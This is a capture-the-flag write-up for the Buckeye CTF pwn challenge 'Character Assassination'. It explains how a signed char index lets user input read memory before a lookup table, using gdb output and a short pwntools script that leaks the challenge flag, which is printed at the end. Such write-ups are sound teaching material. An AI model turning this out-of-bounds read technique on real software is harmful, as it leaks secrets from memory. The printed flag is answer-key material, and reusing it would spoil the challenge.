# Buckeye CTF: Character Assassination

Author: Gabriel Sherman (gabesherman.0)

## Description

* Challenge author: jm8
* Category: pwn
* Point value: 100

> tHe bEsT WaY To wIn aN ArGuMeNt iS To rEpEaT EvErYtHiNg tHe oThEr pErSoN SaYs lIkE ThIs

Files:

* [character_assassination](./character_assassination)
* [character_assassination.c](./character_assassination.c)
## Tools used

* gdb
* pwntools

## Initial Analysis
By looking at the source, we see the program has global variables `flag`, `upper`, and `lower`. We see that flag is located above these lists, so it is likely located at a lower location in memory as well.
This hinted that the likely solution would be to take advantage of the accesses to `upper` and `lower` to leak information about the flag.
```
char flag[64] = "bctf{fake_flag}";

char upper[] = {
    '?',  '?',  '?', '?', '?', '?', '?', '?', '?', '\t', '\n', '\x0b', '\x0c',
    '\r', '?',  '?', '?', '?', '?', '?', '?', '?', '?',  '?',  '?',    '?',
    '?',  '?',  '?', '?', '?', '?', ' ', '!', '"', '#',  '$',  '%',    '&',
    '\'', '(',  ')', '*', '+', ',', '-', '.', '/', '0',  '1',  '2',    '3',
    '4',  '5',  '6', '7', '8', '9', ':', ';', '<', '=',  '>',  '?',    '@',
    'A',  'B',  'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J',  'K',  'L',    'M',
    'N',  'O',  'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W',  'X',  'Y',    'Z',
    '[',  '\\', ']', '^', '_', '`', 'A', 'B', 'C', 'D',  'E',  'F',    'G',
    'H',  'I',  'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q',  'R',  'S',    'T',
    'U',  'V',  'W', 'X', 'Y', 'Z', '{', '|', '}', '~', 
};
char lower[] = {
    '?',  '?',  '?', '?', '?', '?', '?', '?', '?', '\t', '\n', '\x0b', '\x0c',
    '\r', '?',  '?', '?', '?', '?', '?', '?', '?', '?',  '?',  '?',    '?',
    '?',  '?',  '?', '?', '?', '?', ' ', '!', '"', '#',  '$',  '%',    '&',
    '\'', '(',  ')', '*', '+', ',', '-', '.', '/', '0',  '1',  '2',    '3',
    '4',  '5',  '6', '7', '8', '9', ':', ';', '<', '=',  '>',  '?',    '@',
    'a',  'b',  'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',  'k',  'l',    'm',
    'n',  'o',  'p', 'q', 'r', 's', 't', 'u', 'v', 'w',  'x',  'y',    'z',
    '[',  '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd',  'e',  'f',    'g',
    'h',  'i',  'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q',  'r',  's',    't',
    'u',  'v',  'w', 'x', 'y', 'z', '{', '|', '}', '~',
};
```


## Solution
First, lets confirm our suspicion that the flag is located above the `upper` and `lower` arrays. Since these variables are already declared outside of `main`, they will be in the `.data` section of the elf.
```
$ gdb character_assassination
pwndbg> b main
pwndbg> r
pwndbg> info files
file type elf64-x86-64.
    Entry point: 0x555555555120
    0x0000555555554318 - 0x0000555555554334 is .interp
    0x0000555555554338 - 0x0000555555554358 is .note.gnu.property
    0x0000555555554358 - 0x000055555555437c is .note.gnu.build-id
    0x000055555555437c - 0x000055555555439c is .note.ABI-tag
    0x00005555555543a0 - 0x00005555555543d0 is .gnu.hash
    0x00005555555543d0 - 0x0000555555554538 is .dynsym
    0x0000555555554538 - 0x0000555555554607 is .dynstr
    0x0000555555554608 - 0x0000555555554626 is .gnu.version
    0x0000555555554628 - 0x0000555555554658 is .gnu.version_r
    0x0000555555554658 - 0x0000555555554748 is .rela.dyn
    0x0000555555554748 - 0x00005555555547f0 is .rela.plt
    0x0000555555555000 - 0x000055555555501b is .init
    0x0000555555555020 - 0x00005555555550a0 is .plt
    0x00005555555550a0 - 0x00005555555550b0 is .plt.got
    0x00005555555550b0 - 0x0000555555555120 is .plt.sec
    0x0000555555555120 - 0x0000555555555425 is .text
    0x0000555555555428 - 0x0000555555555435 is .fini
    0x0000555555556000 - 0x0000555555556012 is .rodata
    0x0000555555556014 - 0x0000555555556058 is .eh_frame_hdr
    0x0000555555556058 - 0x0000555555556160 is .eh_frame
    0x0000555555557d88 - 0x0000555555557d90 is .init_array
    0x0000555555557d90 - 0x0000555555557d98 is .fini_array
    0x0000555555557d98 - 0x0000555555557f88 is .dynamic
    0x0000555555557f88 - 0x0000555555558000 is .got
    0x0000555555558000 - 0x000055555555815f is .data
    0x0000555555558160 - 0x0000555555558180 is .bss
```
Now let's inspect the contents of `.data`
```
pwndbg> hexdump 0x0000555555558000 0x15f
+0000 0x555555558000  00 00 00 00 00 00 00 00  08 80 55 55 55 55 00 00  │........│..UUUU..│
+0010 0x555555558010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │........│........│
+0020 0x555555558020  62 63 74 66 7b 66 61 6b  65 5f 66 6c 61 67 7d 00  │bctf{fak│e_flag}.│
+0030 0x555555558030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │........│........│
... ↓            skipped 1 identical lines (16 bytes)
+0050 0x555555558050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │........│........│
+0060 0x555555558060  3f 3f 3f 3f 3f 3f 3f 3f  3f 09 0a 0b 0c 0d 3f 3f  │????????│?.....??│
+0070 0x555555558070  3f 3f 3f 3f 3f 3f 3f 3f  3f 3f 3f 3f 3f 3f 3f 3f  │????????│????????│
+0080 0x555555558080  20 21 22 23 24 25 26 27  28 29 2a 2b 2c 2d 2e 2f  │.!"#$%&'│()*+,-./│
+0090 0x555555558090  30 31 32 33 34 35 36 37  38 39 3a 3b 3c 3d 3e 3f  │01234567│89:;<=>?│
+00a0 0x5555555580a0  40 41 42 43 44 45 46 47  48 49 4a 4b 4c 4d 4e 4f  │@ABCDEFG│HIJKLMNO│
+00b0 0x5555555580b0  50 51 52 53 54 55 56 57  58 59 5a 5b 5c 5d 5e 5f  │PQRSTUVW│XYZ[\]^_│
+00c0 0x5555555580c0  60 41 42 43 44 45 46 47  48 49 4a 4b 4c 4d 4e 4f  │`ABCDEFG│HIJKLMNO│
+00d0 0x5555555580d0  50 51 52 53 54 55 56 57  58 59 5a 7b 7c 7d 7e 00  │PQRSTUVW│XYZ{|}~.│
+00e0 0x5555555580e0  3f 3f 3f 3f 3f 3f 3f 3f  3f 09 0a 0b 0c 0d 3f 3f  │????????│?.....??│
+00f0 0x5555555580f0  3f 3f 3f 3f 3f 3f 3f 3f  3f 3f 3f 3f 3f 3f 3f 3f  │????????│????????│
+0100 0x555555558100  20 21 22 23 24 25 26 27  28 29 2a 2b 2c 2d 2e 2f  │.!"#$%&'│()*+,-./│
+0110 0x555555558110  30 31 32 33 34 35 36 37  38 39 3a 3b 3c 3d 3e 3f  │01234567│89:;<=>?│
+0120 0x555555558120  40 61 62 63 64 65 66 67  68 69 6a 6b 6c 6d 6e 6f  │@abcdefg│hijklmno│
+0130 0x555555558130  70 71 72 73 74 75 76 77  78 79 7a 5b 5c 5d 5e 5f  │pqrstuvw│xyz[\]^_│
+0140 0x555555558140  60 61 62 63 64 65 66 67  68 69 6a 6b 6c 6d 6e 6f  │`abcdefg│hijklmno│
+0150 0x555555558150  70 71 72 73 74 75 76 77  78 79 7a 7b 7c 7d 7e     │pqrstuvw│xyz{|}~ │
```

So now we see that the fake flag is located at `0x555555558020`, and the beginning of `upper` is at `0x555555558060`. A difference of 64 bytes.
So how can we access these contents? Let's look at the source again
```
if (!fgets(input, sizeof(input), stdin)) {
      break;
    }
    for (int i = 0; i < sizeof(input) && input[i]; i++) {
      char c = input[i];
      if (i % 2) {
        printf("%c", upper[c]);
      }
      ...
```
Here we see that the program reads in arbitrary user input byte-per-byte, casts each byte to a `char` type, and then accesses the corresponding array with `c` as the index.

When we think about array accesses in the c langauge, these are essentially just offsets to a piece of memory. For example, `upper[3]` is the same thing as `memory address of upper + 3`.
So what if we can make the index negative and read memory before the start address of `upper`? This is essentially the exploit!

`char c = input[i];` is a signed `char`, meaning it can take on the value of `[-127, 127]`. We can get negative values by simply making our `input[i] > 127`.

No we can develop our exploit. We essentially want to leak the bytes from `memory address of upper - 64` to `memory address of upper - 1`.

### A quick refresher on signed algebra:

After solving the challenge I realized I didn't fully understand how the algebra for signed values works, so here's a quick crash course:
- `char` is an 8 byte wide signed type on x86 systems
- When an overflow occurs in C, it simply wraps the value.

Signed arithmetic logic:
```
char result = ((value % 256) + 256) % 256 
if result > 127:
    result -= 256  
```

Okay back to the final solution. I didn't want to have to deal with the hassle of the lower and upper accesses based on the index of the input, so we can simply loop through the program and iteratively leak memory!

### Final Script:
```
from pwn import *

p = process("./character_assassination")

p1 = p8(0x40) # random letter for lower access
offset = 0x40 # start of flag buffer
for i in range(0, 64):
    p2 = p8(128 + offset + i)
    payload = p1 + p2
    p.sendline(payload)
    print(i, p.recv())
```

Flag after some output cleanup:
```
bctf{wOw_YoU_sOlVeD_iT_665ff83d}
```